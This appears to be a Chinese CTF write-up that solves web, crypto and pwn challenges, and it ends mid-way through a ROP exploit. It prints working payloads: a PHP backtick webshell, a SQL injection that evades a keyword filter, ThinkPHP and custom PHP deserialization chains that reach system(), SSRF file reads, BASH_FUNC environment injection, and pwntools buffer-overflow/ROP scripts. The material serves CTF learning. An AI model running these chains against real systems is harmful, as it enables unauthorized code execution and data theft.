6 -》-​​​​5.得到最后一部分flag，将的一部分的flag按下划线分割转小写得到flag​​‍‍Web100_upload‍​​‍&lt;?=`cat /flag`?&gt;​​‍‍hacker跑了一遍字典，发现注入的东西有很多，空格、or、and，但是没有禁用union和select​​那就很明显了，联合查询user()发现最高权限是root，然后我就试试能不能读取文件，发现load_file可以读取&lt;?phpecho \"&lt;!--flag在flag表里--&gt;\";echo \"&lt;br&gt;\";$servername = \"localhost\";$username = \"root\";$password = \"123456\";$dbname = \"ctf\";// 创建连接$conn = new mysqli($servername, $username, $password, $dbname);if ($conn-&gt;connect_error) {    die(\"Connection failed: \" . $conn-&gt;connect_error);}$username=strtolower($_GET['username']);$sensitive_keywords = array(\" \",\"handler\", \"like\", \"or\", \"-~\", \"--\", \"--+\", \"information\", \"xor\", \"and\", \";\", \"&amp;\", \"|\", \"order\", \"floor\",\"sys_tables\",\"sys_columns\",\"sys.schema_table_statistics_with_buffer\",\"sys.schema_table_statistics\",\"mid\", \"ascii\");// 检查参数中是否包含敏感关键词foreach ($sensitive_keywords as $keyword) {    if (strpos($username, $keyword) !== false) {        // 如果参数中包含敏感关键词，弹窗提示用户        die(\"&lt;script&gt;alert('hacker');&lt;/script&gt;\");        // 可以选择终止脚本执行或者做其他处理        exit;    }}$sql=\"select id from flag where id='$username'\";$result = $conn-&gt;query($sql);if ($result-&gt;num_rows &gt; 0) {    // 输出每一行记录的 love 字段值    while($row = $result-&gt;fetch_assoc()) {        echo \"          \" . $row[\"id\"] . \"&lt;br&gt;\";    }} else {    echo \"0 结果\";}// echo $result-&gt;num_rows;// 关闭数据库连接$conn-&gt;close();?&gt;根据它这个表里面的过滤信息，我们直接无列名注入即可payload:http://yuanshen.life:35522/?username=alice'union/**/select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flag)a%23​​‍Oyst3rPHP​​扫描目录可以得到一个www.zip由于这是thinkphp框架写的，所以网站的首页是在app—-controller目录里​​&lt;?phpnamespace app\\controller;use app\\BaseController;class Index extends BaseController{    public function index()    {\t\techo \"RT，一个很简单的Web，给大家送一点分,再送三只生蚝，过年一起吃生蚝哈\";        echo \"&lt;img src='../Oyster.png'\".\"/&gt;\";  \t\t$payload = base64_decode(@$_POST['payload']);        $right = @$_GET['left'];        $left = @$_GET['right'];  \t\t$key = (string)@$_POST['key'];        if($right !== $left &amp;&amp; md5($right) == md5($left)){  \t\t\techo \"Congratulations on getting your first oyster\";\t\t\techo \"&lt;img src='../Oyster1.png'\".\"/&gt;\";  \t\t\tif(preg_match('/.+?THINKPHP/is', $key)){                die(\"Oysters don't want you to eat\");            }            if(stripos($key, '603THINKPHP') === false){                die(\"！！！Oysters don't want you to eat！！！\");            }\t\t\techo \"WOW！！！Congratulations on getting your second oyster\";\t\t\techo \"&lt;img src='../Oyster2.png'\".\"/&gt;\";  \t\t\t@unserialize($payload);\t\t\t//最后一个生蚝在根目录，而且里面有Flag？？？咋样去找到它呢？？？它的名字是什么？？？\t\t\t//在源码的某处注释给出了提示，这就看你是不是真懂Oyst3rphp框架咯！！！\t\t\t//小Tips：细狗函数┗|｀O′|┛ 嗷~~        }    }\tpublic function doLogin()    {    /*emmm我也不知道这是what，瞎写的*/        if ($this-&gt;request-&gt;isPost()) {            $username = $this-&gt;request-&gt;post('username');            $password = $this-&gt;request-&gt;post('password');               if ($username == 'your_username' &amp;&amp; $password == 'your_password') {                  $this-&gt;success('Login successful', 'index/index');            } else {                    $this-&gt;error('Login failed');            }        }    }}很简单的逻辑，就是md5弱比较、正则回溯，然后反序列化而已序列化的链子直接摘抄网上的就行了&lt;?php namespace think\\model\\concern; trait Attribute {     private $data = [\"key\"=&gt;\"cat /Oyst3333333r.php\"];     private $withAttr = [\"key\"=&gt;\"system\"]; } namespace think; abstract class Model {     use model\\concern\\Attribute;     private $lazySave = true;     protected $withEvent = false;     private $exists = true;     private $force = true;     protected $name;     public function __construct($obj=\"\"){         $this-&gt;name=$obj;     } } namespace think\\model; use think\\Model; class Pivot extends Model {} $a=new Pivot(); $b=new Pivot($a); echo base64_encode(serialize($b));import requestspay = \"TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319\"url = \"http://yuanshen.life:37346/?left=s1885207154a&amp;right=s1502113478a\"data = {    \"key\":\"a\"*1000000+\"603THINKPHP\",    \"payload\":pay}res = requests.post(url=url,data=data)print(res.text)​​‍‍EZ_SSRF源代码&lt;?phphighlight_file(__file__);error_reporting(0);function get($url) {    $curl = curl_init();    curl_setopt($curl, CURLOPT_URL, $url);    curl_setopt($curl, CURLOPT_HEADER, 0);    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);    $data = curl_exec($curl);    curl_close($curl);    echo base64_encode($data);    return $data;}class client{    public $url;    public $payload;    public function __construct()    {        $url = \"http://127.0.0.1/\";        $payload = \"system(\\\"cat /flag\\\");\";        echo \"Exploit\";    }    public function __destruct()    {        get($this-&gt;url);    }}// hint:hide other fileif(isset($_GET['Harder'])) {    unserialize($_GET['Harder']);} else {    echo \"You don't know how to pass parameters?\";}?&gt;很简单的一道题，反序列化然后通过ssrf漏洞直接读取flag.php文件&lt;?phpclass client{    public $url;    public $payload;}$a = new client;$a-&gt;url = \"file:///var/www/html/flag.php\";echo serialize($a);?&gt;这里应该算是一个小小的非预期吧，因为出题人的目的应该是在admin.php里&lt;?phperror_reporting(0);include \"flag.php\";highlight_file(__FILE__);$allowed_ip = \"127.0.0.1\";if ($_SERVER['REMOTE_ADDR'] !== $allowed_ip) {    die(\"You can't get flag\");} else {    echo $flag;}?&gt;​​‍‍Not just unserialize‍源代码&lt;?phphighlight_file(__FILE__);class start{    public $welcome;    public $you;    public function __destruct()    {        $this-&gt;begin0fweb();    }    public  function begin0fweb()    {        $p='hacker!';        $this-&gt;welcome-&gt;you = $p;    }}class SE{    public $year;    public function __set($name, $value){        echo '  Welcome to new year!  ';        echo($this-&gt;year);    }}class CR {    public $last;    public $newyear;    public function __tostring() {        if (is_array($this-&gt;newyear)) {            echo 'nonono';            return false;        }        if (!preg_match('/worries/i',$this-&gt;newyear))        {            echo \"empty it!\";            return 0;        }        if(preg_match('/^.*(worries).*$/',$this-&gt;newyear)) {            echo 'Don\\'t be worry';        } else {            echo 'Worries doesn\\'t exists in the new year  ';            empty($this-&gt;last-&gt;worries);        }        return false;    }}class ET{    public function __isset($name)    {        foreach ($_GET['get'] as $inject =&gt; $rce){            putenv(\"{$inject}={$rce}\");        }        system(\"echo \\\"Haven't you get the secret?\\\"\");    }}if(isset($_REQUEST['go'])){    unserialize(base64_decode($_REQUEST['go']));}?&gt;php反序列化，先找到入口点statr—-&gt;destruct—–&gt;begin0fweb​—–&gt;SE—–&gt;set—-&gt;tostring——&gt;isset根据上面的链子编写exp&lt;?phpclass start{    public $welcome;    public $you;}class SE{    public $year;}class CR {    public $last;    public $newyear;}class ET{}$s = new start;$s-&gt;welcome = new SE;$s-&gt;welcome-&gt;year = new CR;#这里大小写绕过一下$s-&gt;welcome-&gt;year-&gt;newyear = \"Worries\";$s-&gt;welcome-&gt;year-&gt;last = new ET;echo base64_encode(serialize($s));?&gt;​​‍成功的来到了这里，接下来就是一个老生常谈的一个考点了，环境变量注入p牛的文章狠狠的推荐一遍https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html最后的payloadhttp://yuanshen.life:39676/?go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXb3JyaWVzIjt9fXM6MzoieW91IjtOO30&amp;get[BASH_FUNC_echo%25%25]=() { cat /ffffllllllaaaaaaaaaaaaaaaaaaggggg; }‍​​‍‍‍Crypto签到Vigenere‍Gn taj xirly gf Fxgjuakd, oe igywnd mt tegbs mnrxxlrivywd sngearbsw wakksre. Bs kpimj gf tank, it bx gur bslenmngn th jfdetagur mt ceei yze Ugnled Lystel tx Amxwaca gjmtrtq.An taj wvegy gf tank nom xmccxjvinz, bw prhugse ts sllbffce hs lhe ytdlopnfg btxas wbyz Meqnuo: Tafl we lmsll ffce wtw logxyzer tsv madj heavj logxyzer. Pj khaeq yivLNUTF{4695vft9-fd68-4684-uj81-u6c1avg6uaft}j yenxwgus ynfanvnsl snuhorm, ffd ag zfdekxlanwnfg og tmr ptwl thty Eexbhg is mt jechsiuek yze lhxl tekwatokd an Nxb Eexbhg, Teqfk, anw Fjizhss. Thx iwtabqk of ljltlxrwnt tww leyy lo yhz.Qou tww inlyjucmjv to bsxorf yze Pkjkidxsl [of Fjpich] tx thx ftovx nf thx ljeamjkt chsxidxsue al xgon tx at il hwrttnf thty lhekj oile gw an hzlbrxfc of pfj wimm lhe Nsatew Xlatxx snd lzygely lham yze Pkjkidxsl, on ank owg nfitbflivx, nfvimj Bapts lo ifrwdityw adajjenvj oita yzis iqsn; am yze strw tifj, gffxw lo mxiaatx gwtwxjf Jaiff anw tmrsxqnes.Iqwasx hsll mt lhe tylenmngn oy yze Pkjkidxsl thty lhe kzlhlxxk emiqgymxsl of hzj suursrigjk nop txfekx lhe iwgspxhl of vtepeeqang Xsylagi lo mtpw pethw in t kww mhslhs.https://www.guballa.de/vigenere-solver‍​​‍签到，确信！题目附件from Crypto.Util.number import *from enc import flagm = bytes_to_long(flag)def gen_keys(bits):    while 1:        p = getPrime(bits)        q = sum([p**i for i in range(7)])        if isPrime(q):            r = getPrime(1024)            n = p*q*r            return p,np,n = gen_keys(512)e = 65537c = pow(m,e,n)print(f\"n = {n}\")print(f\"e = {e}\")print(f\"c = {c}\")'''n = 8361361624563191168612863710516449028280757632934603412143152925186847721821552879338608951120157631182699762833743097837368740526055736516080136520584848113137087581886426335191207688807063024096128001406698217998816782335655663803544853496060418931569545571397849643826584234431049002394772877263603049736723071392989824939202362631409164434715938662038795641314189628730614978217987868150651491343161526447894569241770090377633602058561239329450046036247193745885174295365633411482121644408648089046016960479100220850953009927778950304754339013541019536413880264074456433907671670049288317945540495496615531150916647050158936010095037412334662561046016163777575736952349827380039938526168715655649566952708788485104126900723003264019513888897942175890007711026288941687256962012799264387545892832762304320287592575602683673845399984039272350929803217492617502601005613778976109701842829008365226259492848134417818535629827769342262020775115695472218876430557026471282526042545195944063078523279341459199475911203966762751381334277716236740637021416311325243028569997303341317394525345879188523948991698489667794912052436245063998637376874151553809424581376068719814532246179297851206862505952437301253313660876231136285877214949094995458997630235764635059528016149006613720287102941868517244509854875672887445099733909912598895743707420454623997740143407206090319567531144126090072331e = 65537c = 990174418341944658163682355081485155265287928299806085314916265580657672513493698560580484907432207730887132062242640756706695937403268682912083148568866147011247510439837340945334451110125182595397920602074775022416454918954623612449584637584716343806255917090525904201284852578834232447821716829253065610989317909188784426328951520866152936279891872183954439348449359491526360671152193735260099077198986264364568046834399064514350538329990985131052947670063605611113730246128926850242471820709957158609175376867993700411738314237400038584470826914946434498322430741797570259936266226325667814521838420733061335969071245580657187544161772619889518845348639672820212709030227999963744593715194928502606910452777687735614033404646237092067644786266390652682476817862879933305687452549301456541574678459748029511685529779653056108795644495442515066731075232130730326258404497646551885443146629498236191794065050199535063169471112533284663197357635908054343683637354352034115772227442563180462771041527246803861110504563589660801224223152060573760388045791699221007556911597792387829416892037414283131499832672222157450742460666013331962249415807439258417736128976044272555922344342725850924271905056434303543500959556998454661274520986141613977331669376614647269667276594163516040422089616099849315644424644920145900066426839607058422686565517159251903275091124418838917480242517812783383'''参考ImaginaryCTF 2023 sushttps://tangcuxiaojikuai.xyz/post/ea445335.html解题#sagefrom Crypto.Util.number import *n = 8361361624563191168612863710516449028280757632934603412143152925186847721821552879338608951120157631182699762833743097837368740526055736516080136520584848113137087581886426335191207688807063024096128001406698217998816782335655663803544853496060418931569545571397849643826584234431049002394772877263603049736723071392989824939202362631409164434715938662038795641314189628730614978217987868150651491343161526447894569241770090377633602058561239329450046036247193745885174295365633411482121644408648089046016960479100220850953009927778950304754339013541019536413880264074456433907671670049288317945540495496615531150916647050158936010095037412334662561046016163777575736952349827380039938526168715655649566952708788485104126900723003264019513888897942175890007711026288941687256962012799264387545892832762304320287592575602683673845399984039272350929803217492617502601005613778976109701842829008365226259492848134417818535629827769342262020775115695472218876430557026471282526042545195944063078523279341459199475911203966762751381334277716236740637021416311325243028569997303341317394525345879188523948991698489667794912052436245063998637376874151553809424581376068719814532246179297851206862505952437301253313660876231136285877214949094995458997630235764635059528016149006613720287102941868517244509854875672887445099733909912598895743707420454623997740143407206090319567531144126090072331e = 65537c = 990174418341944658163682355081485155265287928299806085314916265580657672513493698560580484907432207730887132062242640756706695937403268682912083148568866147011247510439837340945334451110125182595397920602074775022416454918954623612449584637584716343806255917090525904201284852578834232447821716829253065610989317909188784426328951520866152936279891872183954439348449359491526360671152193735260099077198986264364568046834399064514350538329990985131052947670063605611113730246128926850242471820709957158609175376867993700411738314237400038584470826914946434498322430741797570259936266226325667814521838420733061335969071245580657187544161772619889518845348639672820212709030227999963744593715194928502606910452777687735614033404646237092067644786266390652682476817862879933305687452549301456541574678459748029511685529779653056108795644495442515066731075232130730326258404497646551885443146629498236191794065050199535063169471112533284663197357635908054343683637354352034115772227442563180462771041527246803861110504563589660801224223152060573760388045791699221007556911597792387829416892037414283131499832672222157450742460666013331962249415807439258417736128976044272555922344342725850924271905056434303543500959556998454661274520986141613977331669376614647269667276594163516040422089616099849315644424644920145900066426839607058422686565517159251903275091124418838917480242517812783383k = 7R = Zmod(n)[\"x\"]while True:    Q = R.quo(R.random_element(k))    pp = gcd(ZZ(list(Q.random_element() ^ n)[1]), n)    if pp != 1:        qq = sum([pp**i for i in range(k)])        rr = n // (pp * qq)        assert n == pp * qq * rr        breakphi = (pp - 1) * (qq - 1) * (rr - 1)d = pow(e, -1, phi)m = pow(c, d, n)print(long_to_bytes(int(m)))‍‍‍SuperbRSA题目附件#user:mumu666from Crypto.Util.number import *p=getPrime(1024)q=getPrime(1024)n=p*qe1=55e2=200m=bytes_to_long(\"flag\")assert(pow(m,5) &lt; n)c1 = pow(m, e1, n)c2 = pow(m, e2, n)print(\"n=\",n)print(\"c1=\",c1)print(\"c2=\",c2)n= 19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023c1= 276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529c2= 11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021变形题 gcd(e1,e2)!=1假设gcd(e1,e2)=x(c1^s1*c2^s2)%n==m1^x%nm=m1^x%nm = m1^x+kne1e2不互素解题#user:mumu666from Crypto.Util.number import *   e1=55e2=200n= 19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023c1= 276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529c2= 11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021import gmpy2import libnum_,s1,s2 = gmpy2.gcdext(e1,e2)m1 = (pow(c1,s1,n)*pow(c2,s2,n))%nprint(m1)x = gmpy2.gcd(e1,e2)print(x)k=0while 1:    m11 = m1+k*n    m,s = gmpy2.iroot(m11,x)    if s:        print(libnum.n2s(int(m)))        break    k+=1‍‍easyLattice题目附件from Crypto.Util.number import *from secret import flagimport gmpy2assert len(flag) == 47f = bytes_to_long(flag)p = getPrime(512)g = getPrime(128)h = gmpy2.invert(f, p) * g % pprint('h =', h)print('p =', p)\"\"\"h = 9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443p = 11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947   \"\"\"NTRU格密码参考链接https://www.cnblogs.com/sCh3n/p/15917388.html解题from Crypto.Util.number import *h = 9848463356094730516607732957888686710609147955724620108704251779566910519170690198684628685762596232124613115691882688827918489297122319416081019121038443p = 11403618200995593428747663693860532026261161211931726381922677499906885834766955987247477478421850280928508004160386000301268285541073474589048412962888947     #f=1427527382696592338597148457263770558761219491396746016810215766179780194787443388228681575452119269880711319897410623591L = Matrix(ZZ, [[1, h*(2**250)],                [0, p*(2**250)]])f, g = L.LLL()[0]print(long_to_bytes(-f))‍‍gggcccddd题目附件from Crypto.Util.number import *from enc import flagm = bytes_to_long(flag)p = getPrime(512)q = getPrime(512)n = p*qe = 65537c1 = pow(m,e,n)c2 = pow(233*m+9527,e,n)print(f'n = {n}')print(f'c1 = {c1}')print(f'c2 = {c2}')print(f'e = {e}')\"\"\"n = 71451784354488078832557440841067139887532820867160946146462765529262021756492415597759437645000198746438846066445835108438656317936511838198860210224738728502558420706947533544863428802654736970469313030584334133519644746498781461927762736769115933249195917207059297145965502955615599481575507738939188415191c1 = 60237305053182363686066000860755970543119549460585763366760183023969060529797821398451174145816154329258405143693872729068255155086734217883658806494371105889752598709446068159151166250635558774937924668506271624373871952982906459509904548833567117402267826477728367928385137857800256270428537882088110496684c2 = 20563562448902136824882636468952895180253983449339226954738399163341332272571882209784996486250189912121870946577915881638415484043534161071782387358993712918678787398065688999810734189213904693514519594955522460151769479515323049821940285408228055771349670919587560952548876796252634104926367078177733076253e = 65537\"\"\"franklin-Reiter相关消息攻击参考链接https://blog.csdn.net/XiongSiqi_blog/article/details/130978226?spm=1001.2014.3001.5502解题from Crypto.Util.number import *n = 71451784354488078832557440841067139887532820867160946146462765529262021756492415597759437645000198746438846066445835108438656317936511838198860210224738728502558420706947533544863428802654736970469313030584334133519644746498781461927762736769115933249195917207059297145965502955615599481575507738939188415191c1 = 60237305053182363686066000860755970543119549460585763366760183023969060529797821398451174145816154329258405143693872729068255155086734217883658806494371105889752598709446068159151166250635558774937924668506271624373871952982906459509904548833567117402267826477728367928385137857800256270428537882088110496684c2 = 20563562448902136824882636468952895180253983449339226954738399163341332272571882209784996486250189912121870946577915881638415484043534161071782387358993712918678787398065688999810734189213904693514519594955522460151769479515323049821940285408228055771349670919587560952548876796252634104926367078177733076253e = 65537def attack(c1, c2):    PR.&lt;x&gt;=PolynomialRing(Zmod(n))    g1 = x^e - c1    g2 = (233*x+9527)^e - c2    def gcd(g1, g2):        while g2:            g1, g2 = g2, g1 % g2            if(g2.degree() % 100 == 0):                print(g2.degree())        return g1.monic()    return -gcd(g1, g2)[0]m1 = attack(c1, c2)flag = long_to_bytes(int(m1))print(flag)‍‍‍‍‍‍Pwn  基本贴的都是脚本，没详解‍[签到]stackfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)binary = ''libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary);libc = elf.libcif (libelf!=''): libc = ELF(libelf)gdbscript = '''continue'''.format(**locals())io = remote('yuanshen.life',33275)#io = process('./pwn')ru(\":\")sl(str(0x230))#gdb.attach(io)ru('command: ')pay = b'cat flag'.ljust(0x58,b'\\x00') + p64(0x04011F7)sl(pay)#gdb.attach(io,gdbscript)io.interactive()‍‍(🩸) [进阶]TalkBoom ()  获取可以 执行到 mov edi,0x100​ 的 token 吧from elftools.elf.elffile import ELFFilefrom pwn import *elf_filename  = './SphinxBomb1'elf = ELF(elf_filename)function_address = elf.symbols#print(function_address)for i in function_address:    if 'main' in i:        backdoor  = function_address[i]        bd_name = i        break#cross_references = []#function_name = bd_nameprint(\"main:\",hex(backdoor))print(\"name:\",bd_name)def find_mov_instructions(elf_filename, start_address, end_address):    mov_addresses = []    with open(elf_filename, 'rb') as f:        elffile = ELFFile(f)        # 遍历所有节        for section in elffile.iter_sections():            # 只查找可执行节            if section.header['sh_type'] == 'SHT_PROGBITS':                data = section.data()                # 计算节的起始地址和结束地址                section_start = section.header['sh_addr']                section_end = section_start + section.header['sh_size']                # 如果节的结束地址在指定范围之外，则跳过该节                if section_end &lt; start_address or section_start &gt; end_address:                    continue                # 在节中搜索 mov edi, 0x100 指令                offset = 0                while offset &lt; len(data):                    # 判断指令是否为 mov edi, 0x100                    if data[offset] == 0xBF and data[offset+1:offset+5] == b'\\x00\\x01\\x00\\x00':                        instr_addr = section_start + offset                        # 如果指令地址在指定范围内，则将其添加到结果列表中                        if instr_addr &gt;= start_address and instr_addr &lt;= end_address:                            mov_addresses.append(instr_addr)                    offset += 1    return mov_addressesstart_address = backdoorend_address = backdoor + 0xF00elf_filename  = './SphinxBomb1'mov_addresses = find_mov_instructions(elf_filename, start_address, end_address)print(\"Addresses of 'mov edi, 0x100' instructions in the range {} - {}:\".format(hex(start_address), hex(end_address)))print(mov_addresses)#exit()for addr in mov_addresses:    t = addr - 0x31print('[+] ', hex(t))def read_bytes_at_address(target_addr):    with open(elf_filename, 'rb') as f:        # 定位到指定地址        data = f.read()        for addrs in range(0x2000,0x48000):            if  data[addrs] == 0x0f:                if  data[addrs + 1] == 0x84:                    p = (u32(data[addrs+2:addrs+6]) + 6 + addrs) + 0x400000                    if p == target_addr:                        return addrs + 0x400000target_addr = trs = read_bytes_at_address(target_addr)print(hex(rs))le = rs - 0x17 + 3f = open(elf_filename,'rb')f.seek(le-0x400000)offset1 = le + 4 + u32(f.read(4))print('token_addr:',hex(offset1))f.seek(offset1 - 0x400000)token = f.read(0x40)print('&gt;&gt;&gt;'+token.decode())‍​​‍‍  完整 exploit 脚本from pwn import *import oss       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)lss     = lambda s                  :log.success('\\033[1;31;40m%s --&gt; 0x%x \\033[0m' % (s, eval(s)))context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    elif args.RE:        return remote()    else:        return process([binary] + argv, *a, **kw)#io = remote('yuanshen.life',10001)io = remote('112.124.59.213',10001)#io = process('./SphinxBomb1')ru('std::io::stdin().read_line(&amp;mut line);')ru('+++\\n')f = open('SphinxBomb1.gz','wb')# 保存 文件ru('This is your Bomb: \\n')ru(\"b'\")f.write(b64d(ru(\"'\\n\").decode()))#gdb.attach(io,'b *0x0405575')f.close()#pause()os.system('gzip -d SphinxBomb1')os.system('ls')ru('Welcome. Now,you can talk with Sphinx. Good luck.\\n')from elftools.elf.elffile import ELFFileelf_filename  = './SphinxBomb1'elf = ELF(elf_filename)function_address = elf.symbols#print(function_address)for i in function_address:    if 'main' in i:        backdoor  = function_address[i]        bd_name = i        break#cross_references = []#function_name = bd_nameprint(\"main:\",hex(backdoor))print(\"name:\",bd_name)# ChatGPTdef find_mov_instructions(elf_filename, start_address, end_address):    mov_addresses = []    with open(elf_filename, 'rb') as f:        elffile = ELFFile(f)        # 遍历所有节        for section in elffile.iter_sections():            # 只查找可执行节            if section.header['sh_type'] == 'SHT_PROGBITS':                data = section.data()                # 计算节的起始地址和结束地址                section_start = section.header['sh_addr']                section_end = section_start + section.header['sh_size']                # 如果节的结束地址在指定范围之外，则跳过该节                if section_end &lt; start_address or section_start &gt; end_address:                    continue                # 在节中搜索 mov edi, 0x100 指令                offset = 0                while offset &lt; len(data):                    # 判断指令是否为 mov edi, 0x100                    if data[offset] == 0xBF and data[offset+1:offset+5] == b'\\x00\\x01\\x00\\x00':                        instr_addr = section_start + offset                        # 如果指令地址在指定范围内，则将其添加到结果列表中                        if instr_addr &gt;= start_address and instr_addr &lt;= end_address:                            mov_addresses.append(instr_addr)                    offset += 1    return mov_addressesstart_address = backdoorend_address = backdoor + 0x900mov_addresses = find_mov_instructions(elf_filename, start_address, end_address)print(\"Addresses of 'mov edi, 0x100' instructions in the range {} - {}:\".format(hex(start_address), hex(end_address)))for addr in mov_addresses:    t = addr - 0x31    print('yes.....')print('[+] ', hex(t))def read_bytes_at_address(target_addr):    with open(elf_filename, 'rb') as f:        # 定位到指定地址        data = f.read()        for addrs in range(0x2000,0x48000):            if  data[addrs] == 0x0f:                if  data[addrs + 1] == 0x84:                    p = (u32(data[addrs+2:addrs+6]) + 6 + addrs) + 0x400000                    if p == target_addr:                        return addrs + 0x400000target_addr = trs = read_bytes_at_address(target_addr)print(hex(rs))le = rs - 0x17 + 3f = open(elf_filename,'rb')f.seek(le-0x400000)offset1 = le + 4 + u32(f.read(4))print('token_addr:',hex(offset1))f.seek(offset1 - 0x400000)token = f.read(0x40)print('&gt;&gt;&gt;'+token.decode())sl(token)rop = ROP('./SphinxBomb1')elf = ELF('./SphinxBomb1')try:    rax = rop.find_gadget(['pop rax','ret'])[0]    rdi = rop.find_gadget(['pop rdi','ret'])[0]    rsi = rop.find_gadget(['pop rsi','ret'])[0]    rcx = rop.find_gadget(['pop rcx','ret'])[0]except:    print('no gadget')    exit()mov_rdx_rcx = next(elf.search(asm('mov rdx,rcx; ret')))mov_rdx_rcx = next(elf.search(asm('mov rdx,rcx; ret')))syscall     = next(elf.search(asm('mov rdx, 0x1D; mov rax, 1; syscall'))) + 14pay = b'A' * 0x38pay += p64(rcx) + p64(0x1000)pay += p64(mov_rdx_rcx)pay += p64(0x404E88)pause()s(pay)pay = b'A' * 0x38pay += p64(rax) + p64(0)pay += p64(rdi) + p64(0)pay += 